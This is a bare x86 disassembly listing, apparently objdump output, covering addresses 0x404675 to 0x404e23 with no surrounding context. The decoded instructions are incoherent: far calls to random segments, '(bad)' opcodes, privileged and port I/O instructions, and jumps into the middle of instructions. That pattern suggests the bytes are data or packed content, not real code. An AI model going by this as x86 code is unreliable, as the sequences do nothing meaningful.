  404675:	add    bh,bl
  404677:	mov    ecx,0x67412ee0
  40467c:	dec    edi
  40467d:	pop    ebp
  40467e:	es dec eax
  404680:	mov    dh,0x93
  404682:	call   0x854b:0x5e0a17b9
  404689:	cmp    dh,BYTE PTR [ebp+0x595360a6]
  40468f:	iret   
  404690:	lea    edi,[edx+0x72]
  404693:	xchg   edi,eax
  404694:	int3   
  404695:	ss call 0x6a69:0x5f57c707
  40469d:	jno    0x404692
  40469f:	fnstcw WORD PTR [esi+0x16]
  4046a2:	retf   
  4046a3:	dec    ecx
  4046a4:	mov    DWORD PTR [ecx+ecx*4],ecx
  4046a7:	pop    edi
  4046a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a9:	jp     0x404707
  4046ab:	inc    esi
  4046ac:	aam    0xdf
  4046ae:	test   al,0x6c
  4046b0:	mov    cl,0x1a
  4046b2:	(bad)  
  4046b3:	outs   dx,BYTE PTR ds:[esi]
  4046b4:	out    dx,al
  4046b5:	jno    0x4046a4
  4046b7:	pop    ss
  4046b8:	sti    
  4046b9:	and    dh,BYTE PTR [eax-0x58]
  4046bc:	test   BYTE PTR [esi-0x62de8e2],dh
  4046c2:	mul    BYTE PTR [ecx+0x3d]
  4046c5:	loop   0x404661
  4046c7:	jg     0x4046aa
  4046c9:	outs   dx,BYTE PTR ds:[esi]
  4046ca:	jns    0x404748
  4046cc:	sub    al,0xa9
  4046ce:	pop    ecx
  4046cf:	fisubr WORD PTR [edi+edi*8-0x69e558e3]
  4046d6:	dec    esi
  4046d7:	add    BYTE PTR [esi+0x20],bh
  4046da:	pop    esp
  4046db:	sub    dh,BYTE PTR [edx-0x360e51ee]
  4046e1:	jge    0x4046f2
  4046e3:	loopne 0x4046cb
  4046e5:	or     esp,DWORD PTR [edi-0x2e]
  4046e8:	es xor eax,0x726b6a9f
  4046ee:	test   dl,al
  4046f0:	pop    edi
  4046f1:	xchg   edi,eax
  4046f2:	inc    ebp
  4046f3:	mov    bl,0x72
  4046f5:	jmp    0x9aaf:0xe4f0813b
  4046fc:	sbb    al,0x9b
  4046fe:	sbb    al,bh
  404700:	add    al,0xc6
  404702:	outs   dx,DWORD PTR ds:[esi]
  404703:	call   0x7edb1393
  404708:	xor    ah,BYTE PTR [ebx]
  40470a:	in     eax,0x39
  40470c:	lock add edx,DWORD PTR [edi]
  40470f:	sahf   
  404710:	(bad)  
  404711:	adc    eax,0x1a6ff89a
  404716:	mov    ah,0x1d
  404718:	shr    BYTE PTR [esi-0x45d0db66],1
  40471e:	sub    ebp,0xa71ef4f4
  404724:	pop    edi
  404725:	xor    al,0xb6
  404727:	xchg   BYTE PTR [ecx-0x67],ah
  40472a:	sbb    dh,BYTE PTR [esi-0x4e]
  40472d:	sbb    eax,0xae496540
  404732:	setl   BYTE PTR [ecx-0x7d0607f5]
  404739:	(bad)  
  40473b:	out    0x3d,al
  40473d:	pop    edx
  40473e:	xchg   ebp,eax
  40473f:	xchg   edx,eax
  404740:	mov    al,0x7d
  404742:	jle    0x40472b
  404744:	leave  
  404745:	aas    
  404746:	pop    edi
  404747:	(bad)  
  404748:	pusha  
  404749:	or     edx,DWORD PTR [ecx+0x4f]
  40474c:	retf   0xc85
  40474f:	add    al,0xa2
  404751:	sti    
  404752:	call   0xc5c1:0x25cb1f99
  404759:	js     0x40471f
  40475b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40475c:	aaa    
  40475d:	inc    esp
  40475e:	inc    ebx
  40475f:	in     al,0xff
  404761:	jne    0x4047d0
  404763:	(bad)  [eax-0x4d00b9c7]
  404769:	(bad)  
  40476a:	aaa    
  40476b:	adc    DWORD PTR [esi],ecx
  40476d:	out    dx,eax
  40476e:	bound  ebp,QWORD PTR [esi+0x13058a39]
  404774:	(bad)  
  404775:	xlat   BYTE PTR ds:[ebx]
  404776:	mov    al,al
  404778:	mov    dl,bl
  40477a:	call   0x3733:0xfbe04b72
  404781:	or     esp,DWORD PTR [eax-0x7d]
  404784:	outs   dx,DWORD PTR ds:[esi]
  404785:	push   esi
  404786:	das    
  404787:	mov    al,ds:0xbb745312
  40478c:	mov    dl,0xc9
  40478e:	push   es
  40478f:	popf   
  404790:	push   ecx
  404791:	jb     0x40479b
  404793:	cdq    
  404794:	lods   eax,DWORD PTR ds:[esi]
  404795:	or     ecx,DWORD PTR [edx]
  404797:	mov    ah,0xd7
  404799:	xchg   edx,ebx
  40479b:	sbb    al,0x79
  40479d:	jbe    0x404739
  40479f:	repz cmp al,BYTE PTR [ebx-0x44]
  4047a3:	fdivr  st,st(7)
  4047a5:	jmp    0xcd66:0xebbdb26
  4047ac:	hlt    
  4047ad:	fwait
  4047ae:	mov    edx,0xdbcc46a7
  4047b3:	jle    0x40477a
  4047b5:	mov    BYTE PTR [ebp-0x62d10dec],dl
  4047bb:	addr16 sahf 
  4047bd:	cli    
  4047be:	mov    ds:0x5c0428be,eax
  4047c3:	gs xchg ebp,eax
  4047c5:	into   
  4047c6:	mov    edx,0xa2b8ed7a
  4047cb:	cmp    esi,DWORD PTR [edx+0x4cafd045]
  4047d1:	mov    edi,0xbb37ef2
  4047d6:	stc    
  4047d7:	mov    ah,0xb5
  4047d9:	fild   QWORD PTR [ebx-0x5e282f03]
  4047df:	pop    ebx
  4047e0:	ja     0x4047ee
  4047e2:	sbb    BYTE PTR [ecx-0x5ae54640],0xa1
  4047e9:	xor    al,0x4a
  4047eb:	pop    ebp
  4047ec:	test   DWORD PTR [ebx],ecx
  4047ee:	jmp    eax
  4047f0:	and    al,0xa6
  4047f2:	dec    eax
  4047f3:	sahf   
  4047f4:	push   cs
  4047f5:	out    0x22,al
  4047f7:	xor    esi,DWORD PTR [ecx+0xacc2a43]
  4047fd:	cmp    BYTE PTR [esi+0x2f],0xaa
  404801:	jns    0x404828
  404803:	push   eax
  404804:	pop    edx
  404805:	retf   
  404806:	mov    dl,0xae
  404808:	or     DWORD PTR [eax-0x7fcdd9cd],0x2c
  40480f:	neg    cl
  404811:	push   ebx
  404812:	jmp    0xb5c8:0xf65cb2d7
  404819:	jmp    0xb69743d
  40481e:	nop
  40481f:	fwait
  404820:	leave  
  404821:	rol    DWORD PTR [edx+edi*4-0x6762b41e],1
  404828:	xor    al,cl
  40482a:	lods   al,BYTE PTR ds:[esi]
  40482b:	add    edx,0x537f886a
  404831:	je     0x4048b2
  404833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404834:	in     eax,0x1d
  404836:	imul   edi,DWORD PTR [ebp-0x3efece19],0x2a
  40483d:	stos   DWORD PTR es:[edi],eax
  40483e:	call   0xdb2f:0xe12c96e4
  404845:	mov    DWORD PTR [edi],esp
  404847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404848:	xlat   BYTE PTR ds:[ebx]
  404849:	(bad)  
  40484a:	push   ebp
  40484b:	rcl    BYTE PTR [ebx-0x6ee085e0],1
  404851:	dec    DWORD PTR [esi+0x5bfbb78e]
  404857:	aad    0xb2
  404859:	dec    ecx
  40485a:	jg     0x4048d0
  40485c:	mov    eax,0x984baaa2
  404861:	or     esp,ebx
  404863:	fwait
  404864:	sbb    eax,0x2cc9932
  404869:	setp   al
  40486c:	loop   0x40489c
  40486e:	lods   al,BYTE PTR ds:[esi]
  40486f:	mov    ecx,0x43c388fe
  404874:	sub    eax,0x3237ef31
  404879:	jmp    0xf78d2c12
  40487e:	mov    eax,ds:0x4646b2c4
  404883:	inc    ecx
  404884:	int3   
  404885:	imul   esi,DWORD PTR [ebx],0xb874850a
  40488b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40488c:	in     al,dx
  40488d:	test   BYTE PTR [ebx+0x7c],bh
  404890:	sti    
  404891:	fwait
  404892:	cmp    al,0x6f
  404894:	rol    cl,cl
  404896:	xchg   ebx,eax
  404897:	sbb    DWORD PTR [ebp-0x29],ebx
  40489a:	fsub   DWORD PTR [edi-0x782da0dd]
  4048a0:	adc    BYTE PTR [ebx],cl
  4048a2:	sbb    al,BYTE PTR [ebp+0x67d5ad54]
  4048a8:	jecxz  0x40483f
  4048aa:	call   0xb978:0xaae19f54
  4048b1:	nop
  4048b2:	push   ecx
  4048b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048b5:	cli    
  4048b6:	test   eax,0xd81b14d9
  4048bb:	data16 idiv BYTE PTR [edx]
  4048be:	mov    al,ds:0xe065026c
  4048c3:	mov    dl,0xb2
  4048c5:	or     BYTE PTR ds:0x729fce0e,bh
  4048cb:	dec    ebx
  4048cc:	sar    cl,0x59
  4048cf:	cwde   
  4048d0:	dec    esi
  4048d1:	fistp  DWORD PTR [edx+0x5a6d1317]
  4048d7:	mov    al,0x2f
  4048d9:	test   DWORD PTR [ebp+0x61341482],ebx
  4048df:	jp     0x4048f3
  4048e1:	dec    esp
  4048e2:	(bad)  
  4048e3:	mov    esi,0x93060afe
  4048e8:	adc    BYTE PTR [ebp+0x6b790329],dl
  4048ee:	and    ebp,DWORD PTR [ecx-0x6565d233]
  4048f4:	std    
  4048f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048f6:	leave  
  4048f7:	adc    BYTE PTR [ebx-0x41587c30],0x86
  4048fe:	js     0x4048da
  404900:	addr16 mov ch,0x62
  404903:	outs   dx,BYTE PTR ds:[esi]
  404904:	mov    dl,0x59
  404906:	and    BYTE PTR [ecx],dl
  404908:	cmp    al,0xc6
  40490a:	push   0xffffff8b
  40490c:	mov    dh,0xb
  40490e:	fs loop 0x404930
  404911:	pop    ebx
  404912:	test   DWORD PTR [edx+ebp*4-0x52],0x5c80b49a
  40491a:	sbb    DWORD PTR [ebx-0x584cb84b],esi
  404920:	jns    0x4048f2
  404922:	mov    eax,ds:0x7fcc7fdf
  404927:	jns    0x4048e6
  404929:	jo     0x4048e9
  40492b:	cmp    DWORD PTR [eax],esp
  40492d:	jmp    0x4048f4
  40492f:	imul   ecx,DWORD PTR [eax+esi*4-0x46],0xffffffba
  404934:	push   esi
  404935:	adc    eax,0x10fca74c
  40493a:	pop    edi
  40493b:	mov    edi,0xd29a38ec
  404940:	mov    ecx,cs
  404942:	rol    DWORD PTR [edi+ebx*4],1
  404945:	push   edi
  404946:	imul   ecx,DWORD PTR [ebp+0x35],0x17a7cd7b
  40494d:	data16 aam 0x13
  404950:	outs   dx,BYTE PTR ds:[esi]
  404951:	pop    eax
  404952:	enter  0xad94,0xd6
  404956:	push   edi
  404957:	ds repnz and al,0xbc
  40495b:	dec    edi
  40495c:	(bad)  
  40495d:	xor    edi,DWORD PTR [esi-0x5b5f2b5b]
  404963:	add    dh,BYTE PTR [ebx]
  404965:	cmp    ebx,0x90ef9c4e
  40496b:	sub    DWORD PTR [edx+0x78c5245c],esi
  404971:	inc    esi
  404972:	pop    ds
  404973:	retf   
  404974:	or     ecx,DWORD PTR es:[edi]
  404977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404978:	sub    DWORD PTR [ecx-0x2d726f1f],esp
  40497e:	call   0x2ee1:0xa7e7da2d
  404985:	pop    es
  404986:	test   DWORD PTR [edi+0x17691f21],esp
  40498c:	imul   edi,DWORD PTR [edi+0x6fca217e],0xc044e49d
  404996:	int3   
  404997:	aad    0xc5
  404999:	sbb    bh,BYTE PTR [edx]
  40499b:	inc    edi
  40499c:	push   ss
  40499d:	je     0x404946
  40499f:	lahf   
  4049a0:	scas   al,BYTE PTR es:[edi]
  4049a1:	or     bl,BYTE PTR [edx]
  4049a3:	xchg   esi,eax
  4049a4:	test   DWORD PTR [ebp+0x1454ebbe],ebp
  4049aa:	jmp    0x40499f
  4049ac:	mov    dl,0xc2
  4049ae:	sub    DWORD PTR [esi+ebx*4+0x41],ebp
  4049b2:	mov    eax,ds:0x280bd806
  4049b7:	jge    0x40496d
  4049b9:	jnp    0x404949
  4049bb:	dec    esp
  4049bc:	(bad)  
  4049bd:	sahf   
  4049be:	call   0x6de8:0x128bdd3a
  4049c5:	jl     0x404a0e
  4049c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c8:	out    dx,al
  4049c9:	dec    ebx
  4049ca:	test   al,0x4b
  4049cc:	mov    dh,0xa8
  4049ce:	xchg   ecx,eax
  4049cf:	clc    
  4049d0:	mov    dl,0x5a
  4049d2:	mov    esi,DWORD PTR [esi+ebx*8+0x45]
  4049d6:	mov    dl,0x3a
  4049d8:	lahf   
  4049d9:	or     ebx,DWORD PTR [esi]
  4049db:	cmc    
  4049dc:	lods   al,BYTE PTR ds:[esi]
  4049dd:	adc    al,dh
  4049df:	fwait
  4049e0:	inc    edi
  4049e1:	xchg   edx,eax
  4049e2:	add    bh,BYTE PTR [edi]
  4049e4:	mov    dl,0x5
  4049e6:	and    BYTE PTR [eax+0x69],ch
  4049e9:	fiadd  WORD PTR [edx]
  4049eb:	mov    al,0x65
  4049ed:	or     eax,eax
  4049ef:	(bad)  [edi+0x207b893d]
  4049f5:	rcr    DWORD PTR [edx+0x289271c3],cl
  4049fb:	scas   eax,DWORD PTR es:[edi]
  4049fc:	inc    ebp
  4049fd:	or     edx,0xffffffa7
  404a00:	imul   esi,DWORD PTR [esi-0xf],0x2e
  404a04:	rcl    BYTE PTR [ecx+0x1a],cl
  404a07:	jno    0x4049bb
  404a09:	and    BYTE PTR ds:[edx-0x30378e1f],cl
  404a10:	pop    eax
  404a11:	or     ebp,DWORD PTR [edi-0x52]
  404a14:	adc    bl,BYTE PTR [eax+0x12c67f31]
  404a1a:	call   0x2377:0x114c9e2f
  404a21:	adc    DWORD PTR [ebp+0x41],edi
  404a24:	out    0x73,al
  404a26:	imul   ebp,DWORD PTR [edx+ecx*2-0x4dbc9820],0x69
  404a2e:	and    al,0x2e
  404a30:	stc    
  404a31:	ret    
  404a32:	call   0x1584:0xa274a171
  404a39:	in     eax,dx
  404a3a:	out    dx,al
  404a3b:	sar    DWORD PTR [esi+0xa],cl
  404a3e:	push   eax
  404a3f:	dec    cx
  404a41:	adc    edi,DWORD PTR [esi+0x227bd9a0]
  404a47:	mov    al,0x4c
  404a49:	cs jmp 0x32db:0x6acdaff2
  404a51:	cmc    
  404a52:	or     bl,BYTE PTR [ebp-0x584e4871]
  404a58:	das    
  404a59:	xchg   DWORD PTR [esi+0x12],esi
  404a5c:	dec    edx
  404a5d:	bound  ebx,QWORD PTR [edx+ecx*2+0x48]
  404a61:	add    eax,0x19adad9a
  404a66:	ins    DWORD PTR es:[edi],dx
  404a67:	cld    
  404a68:	daa    
  404a69:	out    dx,al
  404a6a:	fcomp  QWORD PTR [eax+0x2c15f4f3]
  404a70:	jnp    0x4049fc
  404a72:	fisubr DWORD PTR [eax+0x2f]
  404a75:	sub    DWORD PTR [edi+ebx*8],esi
  404a78:	mov    dl,0x37
  404a7a:	pop    esi
  404a7b:	call   0xb86:0x6ac23458
  404a82:	jg     0x404b02
  404a84:	int    0xfc
  404a86:	mov    edx,0xb2189889
  404a8b:	and    dh,0xcf
  404a8e:	jb     0x404ada
  404a90:	mov    dl,0xbe
  404a92:	pop    esi
  404a93:	add    al,0xa0
  404a95:	gs sub ch,ah
  404a98:	in     eax,dx
  404a99:	or     ecx,DWORD PTR [edi]
  404a9b:	stos   BYTE PTR es:[edi],al
  404a9c:	mov    ds:0x3144ab0e,eax
  404aa1:	pop    esp
  404aa2:	test   bh,dl
  404aa4:	jecxz  0x404abd
  404aa6:	sbb    al,BYTE PTR [edi-0x6c]
  404aa9:	pushf  
  404aaa:	aaa    
  404aab:	mov    cl,0xdc
  404aad:	or     cl,ch
  404aaf:	push   edx
  404ab0:	aam    0x43
  404ab2:	mov    ?,WORD PTR [edx+0x43]
  404ab5:	(bad)  
  404ab6:	mov    edx,cr4
  404ab9:	in     eax,dx
  404aba:	add    eax,0xc0ccc31a
  404abf:	leave  
  404ac0:	data16 adc BYTE PTR [esi],0xbb
  404ac4:	mov    eax,0xcee754c8
  404ac9:	sub    BYTE PTR [ebx],bl
  404acb:	cli    
  404acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404acd:	and    BYTE PTR [edx+0x3013fdb1],bl
  404ad3:	adc    al,BYTE PTR [esi+0x21]
  404ad6:	loopne 0x404a7f
  404ad8:	inc    edx
  404ad9:	adc    esp,0xffffffda
  404adc:	nop
  404add:	sar    BYTE PTR [edx+0x73],1
  404ae0:	mov    dh,0xb1
  404ae2:	pop    ds
  404ae3:	enter  0x6aae,0x5a
  404ae7:	(bad)  
  404ae8:	adc    dl,bl
  404aea:	push   ss
  404aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aec:	adc    eax,DWORD PTR [ebx]
  404aee:	jmp    0x404b29
  404af0:	clc    
  404af1:	rcl    BYTE PTR [ebx+0x66bbb580],1
  404af7:	adc    ebx,DWORD PTR [ecx+0x1ce755b3]
  404afd:	js     0x404ae4
  404aff:	mov    ecx,0xa796ff14
  404b04:	and    esp,DWORD PTR [ebp-0x4]
  404b07:	xor    al,0x16
  404b09:	inc    edx
  404b0a:	mov    ah,0x3f
  404b0c:	jmp    0x62d5:0xca3f36c
  404b13:	ret    
  404b14:	jb     0x404aa1
  404b16:	pop    ebp
  404b17:	adc    DWORD PTR [ebx+ecx*1+0x6aacace3],0x47
  404b1f:	jg     0x404b79
  404b21:	aam    0x91
  404b23:	mov    ebx,0xa76f1fce
  404b28:	dec    edx
  404b29:	mov    dh,0x3a
  404b2b:	mov    bh,0x75
  404b2d:	or     dh,BYTE PTR [esi+edx*8]
  404b30:	push   edx
  404b31:	call   0x5cb9:0x7a0ad22e
  404b38:	and    ebp,DWORD PTR [ebx]
  404b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b3b:	xlat   BYTE PTR ds:[ebx]
  404b3c:	xor    DWORD PTR [esi-0x66],ebp
  404b3f:	cli    
  404b40:	pushf  
  404b41:	pop    ss
  404b42:	mov    bh,0x29
  404b44:	pusha  
  404b45:	xor    edi,ebx
  404b47:	pop    ecx
  404b48:	jb     0x404b55
  404b4a:	mov    al,ds:0xa8b0a96b
  404b4f:	mov    bl,0x8e
  404b51:	mov    ch,0x9a
  404b53:	cmc    
  404b54:	sbb    al,dh
  404b56:	and    esi,DWORD PTR [ebx]
  404b58:	push   esp
  404b59:	stos   BYTE PTR es:[edi],al
  404b5a:	and    DWORD PTR [edi+0x3997733d],0xffffffe4
  404b61:	sar    DWORD PTR [ebx+0x38c3b22e],cl
  404b67:	into   
  404b68:	push   cs
  404b69:	pusha  
  404b6a:	gs push 0x48
  404b6d:	xor    DWORD PTR ds:0xb6310e79,esi
  404b73:	(bad)  
  404b74:	fisttp WORD PTR [ebx]
  404b76:	cmp    eax,0xd4840652
  404b7b:	(bad)  
  404b7c:	mov    dl,0x16
  404b7e:	or     BYTE PTR [ebx+0x4fa6e2fb],dl
  404b84:	mov    bh,0x0
  404b86:	sbb    eax,0x1aed44b7
  404b8b:	dec    edi
  404b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b8d:	lea    esi,[ebx]
  404b8f:	adc    esi,DWORD PTR [edx+0x6d9d975d]
  404b95:	mov    ds,ebp
  404b97:	jno    0x404b31
  404b99:	adc    al,0x5f
  404b9b:	xchg   esp,eax
  404b9c:	xor    BYTE PTR [edx-0x1e381eca],cl
  404ba2:	call   0x9adb38f2
  404ba7:	push   ebp
  404ba8:	mov    edx,0x5edcf79c
  404bad:	inc    edi
  404bae:	jne    0x404c01
  404bb0:	jmp    0x404bb7
  404bb2:	stos   BYTE PTR es:[edi],al
  404bb3:	pop    esi
  404bb4:	mov    al,0xeb
  404bb6:	and    eax,0x5e59bee7
  404bbb:	push   esi
  404bbc:	mov    edi,0x449a9d8b
  404bc1:	xchg   edx,eax
  404bc2:	cmp    edx,DWORD PTR [edx]
  404bc4:	adc    dl,cl
  404bc6:	adc    DWORD PTR [ecx-0x55],edi
  404bc9:	or     edx,edi
  404bcb:	xchg   esp,eax
  404bcc:	jns    0xd443a77f
  404bd2:	fwait
  404bd3:	mov    cl,0x9d
  404bd5:	in     eax,0xa3
  404bd7:	adc    cl,BYTE PTR [edx+0x5e45a10]
  404bdd:	jne    0x404bb7
  404bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404be0:	xchg   ebx,eax
  404be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be2:	adc    BYTE PTR [ebp+esi*8-0x4d67e974],cl
  404be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bea:	mov    bl,0x8d
  404bec:	mov    al,0xe1
  404bee:	je     0x404ba8
  404bf0:	inc    ecx
  404bf1:	or     al,0xaa
  404bf3:	stos   BYTE PTR es:[edi],al
  404bf4:	or     eax,0xd11750e4
  404bf9:	arpl   WORD PTR [esi],dx
  404bfb:	and    esi,DWORD PTR [ebx+0x106795fd]
  404c01:	xchg   esp,eax
  404c02:	in     al,dx
  404c03:	jae    0x404c73
  404c05:	jnp    0x404bbb
  404c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c08:	xchg   esi,eax
  404c09:	ror    DWORD PTR [ecx],cl
  404c0b:	jle    0x404b97
  404c0d:	lock fidivr DWORD PTR [ebx]
  404c10:	mov    al,0xc9
  404c12:	or     dl,BYTE PTR [edi+0x27d7e80e]
  404c18:	pop    ss
  404c19:	test   al,0xcc
  404c1b:	cmova  ecx,DWORD PTR [eax]
  404c1e:	and    al,0xe1
  404c20:	test   al,0x95
  404c22:	in     al,0x25
  404c24:	cmp    dl,BYTE PTR [edi-0x2a]
  404c27:	mov    ch,0xe2
  404c29:	add    cl,BYTE PTR [ebx]
  404c2b:	cmp    esi,DWORD PTR [edx+0x842f071]
  404c31:	rol    BYTE PTR [ecx-0x3bf48f87],cl
  404c37:	cdq    
  404c38:	jle    0x404c75
  404c3a:	mov    esi,0x94e83f41
  404c3f:	sbb    cl,BYTE PTR [ecx+0x35984a00]
  404c45:	nop    esi
  404c48:	adc    ch,BYTE PTR [eax-0x15]
  404c4b:	xchg   edx,eax
  404c4c:	push   esp
  404c4d:	push   cs
  404c4e:	mov    ds:0xa47166c,al
  404c53:	test   al,0x68
  404c55:	xchg   DWORD PTR [edx+0x75],edi
  404c58:	(bad)  
  404c5a:	sbb    edx,DWORD PTR [ecx-0x43]
  404c5d:	add    ch,BYTE PTR [edi+0x56]
  404c60:	bound  ebp,QWORD PTR [ebx+0x1b79b815]
  404c66:	lods   al,BYTE PTR ds:[esi]
  404c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c68:	stos   BYTE PTR es:[edi],al
  404c69:	cmp    al,0xf5
  404c6b:	loop   0x404c60
  404c6d:	pusha  
  404c6e:	jae    0x404ccf
  404c70:	add    eax,DWORD PTR ds:0x632e499a
  404c76:	stc    
  404c77:	push   0xa86581e2
  404c7c:	fimul  WORD PTR [ecx]
  404c7e:	mov    ecx,0x66c5b398
  404c83:	je     0x404ccc
  404c85:	sti    
  404c86:	jnp    0x404c23
  404c88:	mov    bl,0x6
  404c8a:	je     0x404c0c
  404c8c:	lods   eax,DWORD PTR ds:[esi]
  404c8d:	gs (bad) 
  404c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c90:	dec    esi
  404c91:	mov    ch,0x12
  404c93:	inc    ebx
  404c94:	std    
  404c95:	inc    ebx
  404c96:	mov    eax,0x811b294
  404c9b:	(bad)
  404ca0:	mov    ecx,0x50252c66
  404ca5:	or     al,0x1d
  404ca7:	xor    edx,DWORD PTR [edx]
  404ca9:	mov    dh,0x33
  404cab:	inc    ecx
  404cac:	ror    DWORD PTR [ebx],cl
  404cae:	lock xchg ebx,eax
  404cb0:	sub    DWORD PTR [esi-0x63a098be],ebx
  404cb6:	call   0xb489:0x86f418e1
  404cbd:	add    DWORD PTR [eax],eax
  404cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc0:	ss ins BYTE PTR es:[edi],dx
  404cc2:	mov    dh,0x39
  404cc4:	popf   
  404cc5:	jmp    0x779a:0xfc65c55a
  404ccc:	in     eax,0x50
  404cce:	pop    edi
  404ccf:	ins    BYTE PTR es:[edi],dx
  404cd0:	cmp    DWORD PTR [ebx],ebx
  404cd2:	fstp   QWORD PTR [eax-0x26e5aed3]
  404cd8:	jg     0x404d49
  404cda:	iret   
  404cdb:	dec    edx
  404cdc:	call   0xdf67:0x9f9890bf
  404ce3:	xor    esi,DWORD PTR [edx+0x3ba3fa3c]
  404ce9:	jl     0x404c88
  404ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cec:	jge    0x404ccb
  404cee:	push   ds
  404cef:	retw   0x65b9
  404cf3:	dec    edi
  404cf4:	mov    dl,0x89
  404cf6:	xor    edi,DWORD PTR ds:0xaaab74b0
  404cfc:	jle    0x404d08
  404cfe:	pushf  
  404cff:	sbb    al,0x42
  404d01:	pusha  
  404d02:	scas   eax,DWORD PTR es:[edi]
  404d03:	aam    0x4e
  404d05:	jnp    0x404d39
  404d07:	cmp    bl,BYTE PTR [ebx+esi*8-0x66]
  404d0b:	paddq  mm2,mm4
  404d0e:	and    ch,bl
  404d10:	pop    edx
  404d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d12:	sbb    eax,0xac9599a7
  404d17:	loopne 0x404cbc
  404d19:	sub    eax,0x6fb27044
  404d1e:	in     eax,dx
  404d1f:	mov    ebp,0x86458b33
  404d24:	fmul   DWORD PTR [edx]
  404d26:	push   ebp
  404d27:	sahf   
  404d28:	in     al,0xef
  404d2a:	sbb    edi,esp
  404d2c:	aas    
  404d2d:	jmp    0x404d66
  404d2f:	push   edi
  404d30:	pop    esp
  404d31:	(bad)  
  404d32:	mov    ds:0x328b38ae,eax
  404d37:	pop    esi
  404d38:	(bad)  [ebx+0x7f]
  404d3b:	xor    DWORD PTR [eax],esp
  404d3d:	or     ebx,DWORD PTR [eax]
  404d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d40:	movd   esp,mm1
  404d43:	ja     0x404d26
  404d45:	rcl    BYTE PTR [ebp+0x3d499620],1
  404d4b:	out    0x49,eax
  404d4d:	bnd jae 0x404d3f
  404d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d51:	or     esi,DWORD PTR [ebx]
  404d53:	ficomp WORD PTR [eax*8+0x15f9596e]
  404d5a:	xchg   ebx,ecx
  404d5c:	jo     0x404d48
  404d5e:	ficomp DWORD PTR [ebx-0x238d8612]
  404d64:	shr    BYTE PTR [ebx+0xbfdb475],cl
  404d6a:	sbb    eax,0x4705aeda
  404d6f:	mov    ds:0x1982b646,al
  404d74:	int    0xeb
  404d76:	jp     0x404d42
  404d78:	in     al,dx
  404d79:	or     al,0xd5
  404d7b:	sub    ebx,DWORD PTR [edx+0x31d66832]
  404d81:	int3   
  404d82:	jecxz  0x404d1b
  404d84:	sub    BYTE PTR [edx+0x22f1f69a],ch
  404d8a:	xchg   ebx,eax
  404d8b:	rep lods al,BYTE PTR ds:[esi]
  404d8d:	shl    eax,1
  404d8f:	push   ebx
  404d90:	or     ecx,DWORD PTR [edi+esi*4]
  404d93:	push   DWORD PTR [edx]
  404d95:	sub    BYTE PTR [eax+0x66],cl
  404d98:	stos   DWORD PTR es:[edi],eax
  404d99:	in     eax,dx
  404d9a:	xchg   DWORD PTR [edi-0x7a],esp
  404d9d:	lea    esi,[esi-0x2a]
  404da0:	mov    fs,WORD PTR [edx+0x52c82720]
  404da6:	jle    0x404df5
  404da8:	cld    
  404da9:	or     al,0x62
  404dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dac:	retf   0x2844
  404daf:	sar    DWORD PTR [ecx+0x5f],cl
  404db2:	adc    dh,BYTE PTR [edi]
  404db4:	scas   al,BYTE PTR es:[edi]
  404db5:	push   eax
  404db6:	jb     0x404dd4
  404db8:	xor    ah,cl
  404dba:	sub    eax,0x9095daab
  404dbf:	inc    ecx
  404dc0:	imul   ecx,DWORD PTR [ebx],0xc8a1cc51
  404dc6:	retf   
  404dc7:	mov    ?,WORD PTR [eax+0x17]
  404dca:	mov    BYTE PTR [eax],dh
  404dcc:	stc    
  404dcd:	retf   0x39a
  404dd0:	mov    ds:0x2b7cdb5c,al
  404dd5:	or     ebp,DWORD PTR [ebp-0x6a]
  404dd8:	push   esp
  404dd9:	call   0xb8a0:0x587526b
  404de0:	div    BYTE PTR [eax-0x5f]
  404de3:	jp     0x404e29
  404de5:	or     al,0x76
  404de7:	fcom   QWORD PTR [edx-0x61]
  404dea:	cli    
  404deb:	add    BYTE PTR [esi+0x7fef3131],dl
  404df1:	mov    cl,0x9a
  404df3:	repz (bad) 
  404df5:	fwait
  404df6:	retf   
  404df7:	push   eax
  404df8:	sar    BYTE PTR [ebx],cl
  404dfa:	call   0x486e:0xfd408591
  404e01:	pop    esp
  404e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e03:	lods   al,BYTE PTR ds:[esi]
  404e04:	rcl    DWORD PTR [edi],0xf6
  404e07:	jecxz  0x404e3b
  404e09:	not    DWORD PTR [ebp+0x78]
  404e0c:	xrelease xchg BYTE PTR [edx+0x631ad13a],bl
  404e13:	mov    WORD PTR [esi],?
  404e15:	add    ah,BYTE PTR [ebp-0x79c49759]
  404e1b:	outs   dx,DWORD PTR ds:[esi]
  404e1c:	stos   BYTE PTR es:[edi],al
  404e1d:	lods   eax,DWORD PTR ds:[esi]
  404e1e:	idiv   DWORD PTR [ebx]
  404e20:	mov    dl,0x0
  404e22:	xchg   esi,eax
  404e23:	mov    dl,0x9d
